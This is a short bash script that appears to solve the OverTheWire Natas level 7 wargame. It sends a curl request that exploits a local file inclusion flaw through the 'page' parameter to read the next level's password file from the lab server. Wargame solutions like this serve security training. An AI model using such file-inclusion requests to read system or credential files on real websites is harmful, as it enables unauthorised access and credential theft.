#!/bin/bash

curl -u natas7:$(cat keys/sete) http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 2> /dev/null | grep -E "^[[:alpha:]].*"
